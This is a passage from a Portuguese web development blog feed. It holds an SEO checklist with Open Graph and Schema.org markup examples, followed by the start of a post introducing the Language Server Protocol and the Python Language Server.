&lt;p&gt;Pode até parecer um serviço simples, mas os fatores que determinam o ranqueamento das páginas são inúmeros (como por exemplo, seu site possuir &lt;em&gt;HTTPS&lt;/em&gt; ou ser &lt;em&gt;mobile friendly&lt;/em&gt;), e nem todos são necessariamente conhecidos pelo grande público. E até mesmo os amplamente conhecidos necessitam de um trabalho rebuscado, como por exemplo, a estratégia de &lt;a href="https://moz.com/beginners-guide-to-seo/growing-popularity-and-links" title="Link Building &amp;amp; Estabilishing Authority"&gt;&lt;em&gt;link building&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Otimizar é preciso?&lt;/h2&gt;
&lt;p&gt;O &lt;a href="https://resultadosdigitais.com.br" title="Referência em Marketing Digital de resultado"&gt;Resultados Digitais&lt;/a&gt; traz um bom argumento para continuarmos a se importar com &lt;em&gt;SEO&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A otimização de sites para mecanismos de buscas é feita para alcançar o usuário entregando a resposta que ele procura com o formato ideal, oferecendo a melhor experiência possível no ambiente da marca e seguindo as diretrizes dos buscadores.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Do ponto de vista de estratégia de &lt;em&gt;marketing&lt;/em&gt;, &lt;strong&gt;é sim&lt;/strong&gt; interessante que o conteúdo do seu site possua um público alvo bem definido, e que artifícios sejam utilizados para "assegurar" que o conteúdo esteja chegando a esse público. Partindo dessa ótica, o mercado de &lt;em&gt;digital&lt;/em&gt; é super aquecido e soluções vem e vão o tempo todo. Seria no mínimo inocente de nossa parte acreditar que somente ao realizar um bom trabalho técnico estamos cumprindo todas as expectativas em relação ao retorno sobre o investimento.&lt;/p&gt;
&lt;p&gt;As possibilidades vão desde a qualidade do conteúdo, &lt;em&gt;design&lt;/em&gt;, passando pela sua característica de "freshness" ou não, até táticas de crescimento como uso de anúncios patrocinados e viralização.&lt;/p&gt;
&lt;p&gt;Do ponto de vista de desenvolvimento de &lt;em&gt;software&lt;/em&gt;, se seguirmos as boas práticas de desenvolvimento &lt;em&gt;web&lt;/em&gt; possivelmente estaremos produzindo uma solução "SEO friendly". &lt;em&gt;URLs&lt;/em&gt; amigáveis, boa performance (velocidade), &lt;em&gt;markup&lt;/em&gt; semântico, etc. São algumas das práticas &lt;em&gt;top of mind&lt;/em&gt;, mas na realidade temos algumas outras que possuem impacto de igual importância.&lt;/p&gt;
&lt;h2&gt;Checklist&lt;/h2&gt;
&lt;p&gt;Quando trabalhei no &lt;a href="https://globoesporte.globo.com/" title="O site de esportes da Globo"&gt;&lt;em&gt;Globoesporte.com&lt;/em&gt;&lt;/a&gt;, uma das garantias de bom resultado nos mecanismos de busca era sempre fazer um site acessível. Naquela época isso era "facilmente" validado com um leitor de telas, ou assegurando que pessoas com dificuldade motora pudessem navegar pelo site.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/seo-caps-todolist.png" width="740" height="555" title="Anote aí no seu caderninho para entender a referência depois (marvelcinematicuniverse.wikia.com)" alt="Anote aí no seu caderninho para entender a referência depois (marvelcinematicuniverse.wikia.com)"&gt;&lt;/p&gt;
&lt;p&gt;Mas naquela época também havia todo um time de arquitetos da informação para ajudar na estruturação de conteúdo, &lt;em&gt;markup&lt;/em&gt; e rotas.&lt;/p&gt;
&lt;p&gt;Hoje em dia, além desses fundamentais aspectos, possuímos alguns outros que devem ser levados em consideração ao se construir um site ou aplicação "SEO-friendly".&lt;/p&gt;
&lt;p&gt;Para me ajudar a compreender tais aspectos, utilizei o site &lt;a href="https://www.woorank.com/" title="Make your site easy to find"&gt;&lt;em&gt;Woorank&lt;/em&gt;&lt;/a&gt; para gerar um &lt;em&gt;checklist&lt;/em&gt; do que é necessário cumprir quando o assunto é otimização.&lt;/p&gt;
&lt;h3&gt;Markup &amp;amp; conteúdo&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;title&lt;/code&gt;: É fundamental possuir a tag &lt;code&gt;&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;&lt;/code&gt;, e que ela de forma concisa explique do que se trata o seu conteúdo/aplicação.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;description&lt;/code&gt;: Com o uso da &lt;code&gt;&amp;lt;meta name="description" content="..." /&amp;gt;&lt;/code&gt; somos capazes de descrever a página e influenciar em como ela será exibida em um resultado de busca. É recomendado algo em torno de 70 e 160 caracteres, e que a descrição contenha as &lt;em&gt;keywords&lt;/em&gt; mais importantes do seu conteúdo.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;headings&lt;/code&gt;: De &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt; a &lt;code&gt;&amp;lt;h6&amp;gt;&lt;/code&gt;, os títulos são uma grande forma de estruturar o seu conteúdo. Possuir as palavras-chaves mais importantes neles impacta positivamente o ranqueamento.&lt;/li&gt;
&lt;li&gt;Atributo &lt;code&gt;alt&lt;/code&gt;: Textos alternativos são importantes para imagens. Leitores de tela usarão esse atributo para descrever a imagem para os seus usuários.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Nos itens acima temos a responsabilidade dividida: Enquanto o desenvolvedor se compromete em produzir um &lt;em&gt;HTML&lt;/em&gt; válido e bem estruturado, a produção de conteúdo se compromete em produzir títulos e palavras-chaves relevantes para o assunto sendo publicado.&lt;/p&gt;
&lt;h3&gt;Gestão de URLs&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Links quebrados: Um problema grave e que deve ser evitado sempre. Teoricamente abalam a reputação do seu site, e sem dúvida nenhuma prejudicam a usabilidade. Ferramentas como o &lt;a href="https://search.google.com/search-console/about" title="Monitore o seu site"&gt;Google SearchConsole&lt;/a&gt; são fundamentais para prevenir esse tipo de problema.&lt;/li&gt;
&lt;li&gt;Resolução &lt;code&gt;www&lt;/code&gt;: Com o &lt;em&gt;HTTPS&lt;/em&gt;, é normal solicitarmos ao navegador do usuário o &lt;em&gt;redirect&lt;/em&gt; para a versão segura, quando o acesso é realizado via &lt;em&gt;HTTP&lt;/em&gt;. O domínio &lt;em&gt;HTTPS&lt;/em&gt; deveria ser sempre o seu "preferred domain", mesmo se o usuário utilizar o prefixo &lt;code&gt;www.&lt;/code&gt; na &lt;em&gt;URL&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;robots.txt&lt;/code&gt;: É a forma de você informar aos robôs que determinadas páginas ou diretórios não precisam ser acessados. Útil para ocultar áreas restritas ou de testes do seu site dos mecanismos de busca.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sitemap.xml&lt;/code&gt;: Um mapa do site legível para robôs. Nele, além de especificar as &lt;em&gt;URLs&lt;/em&gt;, você também pode descrever a sua prioridade, última atualização, com qual frequência a mesma muda, etc.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;URLs amigáveis&lt;/em&gt;: &lt;em&gt;URLs&lt;/em&gt; sem &lt;em&gt;underscore&lt;/em&gt;, sem parâmetros (como &lt;code&gt;noticia.php?id=421&lt;/code&gt;), e que de fato fazem algum sentido para o usuário. &lt;em&gt;URLs&lt;/em&gt; amigáveis são preferidas pelos mecanismos de buscas, e se pensarmos pelo "humano" da coisa, é mais fácil para seu público identificar e até memorizar a rota para um conteúdo. Sem contar que palavras-chave na &lt;em&gt;URL&lt;/em&gt; são um &lt;em&gt;plus&lt;/em&gt; para o ranqueamento.&lt;/li&gt;
&lt;li&gt;Domínio: Evite domínios longos. Prefira descrever alguma página levando em consideração a sua &lt;em&gt;URL&lt;/em&gt; completa (exemplo: meusite.com/produtos/camiseta).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Nessa categoria temos uma presença mais técnica. Utilizar ferramentas como o &lt;em&gt;SearchConsole&lt;/em&gt; ajuda a identificar problemas com &lt;em&gt;URL&lt;/em&gt;. Ter um &lt;em&gt;CMS&lt;/em&gt; que produza &lt;em&gt;URLs&lt;/em&gt; amigáveis é mais que obrigatório, e gerenciar artefatos como &lt;code&gt;robots.txt&lt;/code&gt; e &lt;code&gt;sitemap.xml&lt;/code&gt; deve fazer parte do &lt;em&gt;pipeline&lt;/em&gt; de produção do seu conteúdo.&lt;/p&gt;
&lt;h3&gt;Outros&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;favicon&lt;/code&gt;: Faz parte da sua marca, portanto, essencial.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Assets&lt;/em&gt;: Minificados, comprimidos e cacheáveis (essa tática pode mudar caso você suporte amplamente &lt;em&gt;HTTP/2&lt;/em&gt;).&lt;/li&gt;
&lt;li&gt;Performance: Relacionado com o item acima, mas com maior profundidade. Métricas como &lt;a href="https://www.searchenginepeople.com/blog/16081-time-to-first-byte-seo.html" title="What Is Time To First Byte, And How To Improve It"&gt;&lt;em&gt;Time to First Byte&lt;/em&gt;&lt;/a&gt; são importantes e precisam ser monitoradas. O &lt;a href="https://developers.google.com/speed/pagespeed" title="PageSpeed"&gt;&lt;em&gt;Google PageSpeed&lt;/em&gt;&lt;/a&gt; é fundamental nesse processo.&lt;/li&gt;
&lt;li&gt;Idioma: Especificar o idioma pode ajudar o navegador do usuário a lidar com traduções e renderização de fontes e textos.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Aqui é chover no molhado para quem já tem certa experiência com &lt;em&gt;web&lt;/em&gt;. Amplamente técnico, e parte de qualquer &lt;em&gt;build&lt;/em&gt; e &lt;em&gt;dashboard&lt;/em&gt; de métricas.&lt;/p&gt;
&lt;h3&gt;Conteúdo estruturado&lt;/h3&gt;
&lt;p&gt;Embora um &lt;em&gt;HTML&lt;/em&gt; bem escrito, com &lt;em&gt;tags&lt;/em&gt; da &lt;em&gt;HTML5&lt;/em&gt;, teoricamente seja o suficiente para uma boa apresentação e compreensão do conteúdo, você sempre pode dar um passo além e adicionar mais marcação que traga ainda mais significado ao seu texto.&lt;/p&gt;
&lt;p&gt;O &lt;a href="https://opengraphprotocol.org" title="The Open Graph protocol"&gt;&lt;em&gt;Open Graph protocol&lt;/em&gt;&lt;/a&gt; é uma maneira de enriquecer o seu documento através de &lt;em&gt;markup&lt;/em&gt; simples, que acrescentam metadados e resultam em uma melhor interação com as redes sociais. Em outras palavras, são as propriedades &lt;code&gt;og&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt; &lt;span class="na"&gt;prefix&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;og: http://ogp.me/ns#&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;The Rock (1996)&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;property&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;og:title&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;The Rock&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;property&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;og:type&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;video.movie&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;property&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;og:url&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.imdb.com/title/tt0117500/&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;property&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;og:image&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://ia.media-imdb.com/images/rock.jpg&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
...
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
...
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Dessa forma você possui maior controle sobre como o seu documento irá se "comportar" quando interagindo com o &lt;em&gt;Facebook&lt;/em&gt; (por exemplo). &lt;a href="https://sitechecker.pro/open-graph/" title="What is Open Graph and How to Use It in Social Networks"&gt;Leia mais sobre Open Graph&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Uma maneira de dar significado a cada pedaço do seu conteúdo é através do &lt;a href="https://schema.org/docs/gs.html#microdata_how" title="Getting started with schema.org using Microdata"&gt;Schema.org&lt;/a&gt;. Se você utilizar o vocabulário com &lt;em&gt;Microdata&lt;/em&gt;, é possível aplicar semântica com pouca alteração no seu &lt;em&gt;HTML&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;itemscope&lt;/span&gt; &lt;span class="na"&gt;itemtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://schema.org/Movie&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="na"&gt;itemprop&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Avatar&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Director: &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;span&lt;/span&gt; &lt;span class="na"&gt;itemprop&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;director&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;James Cameron&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; (born August 16, 1954)&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;span&lt;/span&gt; &lt;span class="na"&gt;itemprop&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;genre&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Science fiction&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;../movies/avatar-theatrical-trailer.html&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;itemprop&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;trailer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Trailer&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note a presença de atributos como &lt;code&gt;itemscope&lt;/code&gt;, &lt;code&gt;itemtype&lt;/code&gt; e &lt;code&gt;itemprop&lt;/code&gt;. Leia mais sobre &lt;a href="https://schema.org/" title="a collaborative, community activity with a mission to create, maintain, and promote schemas for structured data on the Internet, on web pages, in email messages, and beyond"&gt;Schema.org&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Aqui, estamos falando de uma tarefa dividida entre o desenvolvedor e o arquiteto da informação. Não acredito que a sua utilização fará alguma diferença para o usuário em seu navegador, porém, outras "máquinas" (como o &lt;em&gt;Facebook&lt;/em&gt; ou a busca do &lt;em&gt;Google&lt;/em&gt;) podem tirar proveito disso para entender mais sobre o seu conteúdo.&lt;/p&gt;
&lt;h3&gt;Mobile&lt;/h3&gt;
&lt;p&gt;Praticar o &lt;a href="http://bradfrost.com/blog/post/mobile-first-responsive-web-design/" title="mobile-first responsive web design"&gt;&lt;em&gt;Mobile-First&lt;/em&gt;&lt;/a&gt;, é uma prática mais que essencial no seu processo de desenvolvimento. O &lt;em&gt;Google&lt;/em&gt; possui uma &lt;a href="https://search.google.com/test/mobile-friendly" title="Mobile-Friendly"&gt;ferramenta bem interessante&lt;/a&gt; que valida se o seu &lt;em&gt;website&lt;/em&gt; está otimizado para dispositivos móveis.&lt;/p&gt;
&lt;p&gt;Puramente técnica essa parte, com responsabilidade dividida entre engenharia, &lt;em&gt;design&lt;/em&gt; e arquitetura da informação. Se você estiver utilizando &lt;a href="https://www.smashingmagazine.com/2011/01/guidelines-for-responsive-web-design/" title="Responsive web Design – What It Is And How To Use It"&gt;&lt;em&gt;Responsive Design&lt;/em&gt;&lt;/a&gt; e pensando na renderização do site primeiro no &lt;em&gt;mobile&lt;/em&gt;, você já está no caminho certo.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Do ponto de vista do desenvolvedor &lt;em&gt;web&lt;/em&gt;, produzir uma solução seguindo as boas práticas amplamente conhecidas no mercado (de desenvolvimento, segurança e performance), e tendo como ponto focal o usuário e sua usabilidade/acessibilidade, produzirá quase o mesmo resultado que desenvolver orientado à otimizações para mecanismos de busca.&lt;/p&gt;
&lt;p&gt;Mas vale levar em consideração que a técnica não para por aí. &lt;em&gt;Design&lt;/em&gt; e arquitetura da informação também são fundamentais para atingirmos tais resultados. Não subestime o seu time de &lt;em&gt;UX&lt;/em&gt;! Eles provavelmente entendem mais sobre o comportamento e contexto do usuário do que você (programador).&lt;/p&gt;
&lt;p&gt;Ainda há o aspecto de &lt;em&gt;marketing&lt;/em&gt; e publicidade do conteúdo. Essa é uma área na qual eu sou um completo ignorante, portanto, só posso imaginar que exista uma gama de práticas e ferramentas que devem fazer parte do dia a dia desse profissional.&lt;/p&gt;
&lt;p&gt;Talvez a palavra "otimizar" dê a impressão que "algo além" deva ser feito para atingir determinados resultados. E no fim das contas, isso faz sentido. &lt;em&gt;SEO&lt;/em&gt; abrange diferentes disciplinas que, separadas podem resultar em produtos razoáveis, mas que unidas em um objetivo comum são mais propensas a ter um bom resultado.&lt;/p&gt;
&lt;p&gt;De qualquer forma, dar uma ajudinha na indexação do seu conteúdo não faz mal a ninguém.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://resultadosdigitais.com.br/especiais/o-que-e-seo/"&gt;Resultados Digitais: Tudo sobre Search Engine Optimization&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="seo"></category></entry><entry><title>LSP e o PyLS</title><link href="https://klauslaube.com.br/2019/05/24/lsp-e-o-pyls.html" rel="alternate"></link><published>2019-05-24T10:53:00-03:00</published><updated>2019-05-24T10:53:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-05-24:/2019/05/24/lsp-e-o-pyls.html</id><summary type="html">&lt;p&gt;Uma das virtudes do &lt;a href="https://klauslaube.com.br/tag/vscode.html" title="Leia mais sobre o editor"&gt;&lt;em&gt;VS Code&lt;/em&gt;&lt;/a&gt; é como ele integra-se facilmente com diferentes linguagens.
O esforço é pequeno, geralmente resumindo-se à instalação de um único &lt;em&gt;plugin&lt;/em&gt;. Essa característica o torna uma ferramenta extremamente
produtiva, e que vem conquistando o coração dos desenvolvedores ao redor do mundo.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O curioso é que …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Uma das virtudes do &lt;a href="https://klauslaube.com.br/tag/vscode.html" title="Leia mais sobre o editor"&gt;&lt;em&gt;VS Code&lt;/em&gt;&lt;/a&gt; é como ele integra-se facilmente com diferentes linguagens.
O esforço é pequeno, geralmente resumindo-se à instalação de um único &lt;em&gt;plugin&lt;/em&gt;. Essa característica o torna uma ferramenta extremamente
produtiva, e que vem conquistando o coração dos desenvolvedores ao redor do mundo.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O curioso é que o &lt;em&gt;VS Code&lt;/em&gt; utiliza um protocolo aberto para ter esse "jeitão" de &lt;em&gt;IDE&lt;/em&gt;, chamado &lt;em&gt;Language Server Protocol&lt;/em&gt;,
que entre outras funcionalidades traz ao editor a possibilidade de &lt;em&gt;autocomplete&lt;/em&gt;, &lt;em&gt;go to definition&lt;/em&gt;, &lt;em&gt;diagnosis&lt;/em&gt; e &lt;em&gt;documentation&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É... &lt;em&gt;Microsoft&lt;/em&gt; popularizando protocolos abertos. Tempos interessantes esses que vivemos, não?&lt;/p&gt;
&lt;h2&gt;LSP - Language Server Protocol&lt;/h2&gt;
&lt;p&gt;Durante o desenvolvimento do &lt;em&gt;VS Code&lt;/em&gt;, a &lt;em&gt;Microsoft&lt;/em&gt; introduziu o &lt;a href="https://microsoft.github.io/language-server-protocol/" title="Leia na página oficial do projeto"&gt;&lt;em&gt;Language Server Protocol&lt;/em&gt;&lt;/a&gt;.
O &lt;a href="https://langserver.org/" title="A community-driven source of knowledge for Language Server Protocol implementations"&gt;langserver.org&lt;/a&gt; o define da seguinte forma:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Language Server protocol is used between a tool (the client) and a language smartness provider (the server) to integrate
features like auto complete, go to definition, find all references and alike into the tool.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em outras palavras, é um &lt;a href="https://microsoft.github.io/language-server-protocol/specification" title="Leia a especificação completa"&gt;protocolo&lt;/a&gt; que descreve
a comunicação entre um cliente (um editor de textos, por exemplo) e um servidor (ligado à uma determinada linguagem), com a motivação de proporcionar e enriquecer
ferramentas de desenvolvimento.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vim-lsp.jpg" width="650" height="296" title="Ilustração de como funciona a comunicação entre cliente e servidor (kieranbamforth.me)" alt="Ilustração de como funciona a comunicação entre cliente e servidor (kieranbamforth.me)"&gt;&lt;/p&gt;
&lt;p&gt;Ou seja, podemos ter uma solução única para &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, que traga as mesmas funcionalidades para diferentes
editores ou &lt;em&gt;IDEs&lt;/em&gt;. Em contrapartida, podemos ter um único editor que suporte diferentes linguagens e tais funcionalidades avançadas.
O &lt;em&gt;langserver.org&lt;/em&gt; chama esse problema de "The Matrix Problem":&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/lsp-the-matrix-problem.png" width="740" height="155" title="Com LSP, temos Go funcionando para diferentes editores, seguindo os mesmos princípios (langserver.org)" alt="Com LSP, temos Go funcionando para diferentes editores, seguindo os mesmos princípios (langserver.org)"&gt;&lt;/p&gt;
&lt;p&gt;Como afirma o site oficial do projeto:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;LSP is a win for both language providers and tooling vendors!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Como funciona?&lt;/h2&gt;
&lt;p&gt;Na prática, o que acontece é uma comunicação inter-processos entre o &lt;em&gt;language server&lt;/em&gt; e a ferramenta de desenvolvimento. O protocolo utilizado para tal operação é o &lt;em&gt;JSON-RPC&lt;/em&gt;,
um protocolo simples, e com um formato de dados extremamente popular.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/language-server-sequence.png" width="740" height="307" title="Exemplo de como funciona a comunicação entre cliente e servidor (microsoft.github.io)" alt="Exemplo de como funciona a comunicação entre cliente e servidor (microsoft.github.io)"&gt;&lt;/p&gt;
&lt;p&gt;Nem toda linguagem pode suportar todas as funcionalidade definidas pelo protocolo (o mesmo vale para as ferramentas de desenvolvimento), mas isso não impede a sua adoção.
O protocolo permite que tanto cliente como servidor "anunciem" suas capacidades, portanto, as duas pontas podem ter um comportamento preventivo quando determinada capacidade
(como &lt;em&gt;go to definition&lt;/em&gt;) não é suportada.&lt;/p&gt;
&lt;h2&gt;PyLS - Python Language Server&lt;/h2&gt;
&lt;p&gt;Para &lt;em&gt;Python&lt;/em&gt;, além do &lt;em&gt;language server&lt;/em&gt; implementado pela própria &lt;em&gt;Microsoft&lt;/em&gt; e &lt;a href="https://github.com/microsoft/python-language-server" title="Repositório do Microsoft Python Language Server"&gt;usado no &lt;em&gt;VS Code&lt;/em&gt;&lt;/a&gt;,
temos o &lt;a href="https://github.com/palantir/python-language-server" title="Repositório do projeto"&gt;&lt;em&gt;Python Language Server&lt;/em&gt;&lt;/a&gt;. Ele conta com as seguintes funcionalidades:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Auto completion&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Code linting&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Signature help&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Go to definition&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Hover&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Find references&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Document symbols&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Document formatting&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;O que acho mais interessante em relação ao projeto é que ele não reinventa a roda. Por exemplo, ele não implementa uma nova ferramenta de &lt;em&gt;linting&lt;/em&gt;, pelo contrário, ele utiliza ferramentas
que já são bem conhecidas pela comunidade:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Auto completion&lt;/em&gt;, &lt;em&gt;definitions&lt;/em&gt;, &lt;em&gt;hover&lt;/em&gt;, &lt;em&gt;references&lt;/em&gt;, &lt;em&gt;signature help&lt;/em&gt; e &lt;em&gt;symbols&lt;/em&gt; são resolvidos via &lt;a href="https://github.com/davidhalter/jedi" title="Awesome completion and static analysis for Python"&gt;&lt;em&gt;Jedi&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Auto completion&lt;/em&gt; e &lt;em&gt;renaming&lt;/em&gt; é resolvido via &lt;a href="https://github.com/python-rope/rope" title="Python refactoring library"&gt;&lt;em&gt;Rope&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Linting&lt;/em&gt; é resolvido via &lt;a href="https://github.com/PyCQA/mccabe" title="McCabe complexity checker"&gt;&lt;em&gt;McCabe&lt;/em&gt;&lt;/a&gt;,
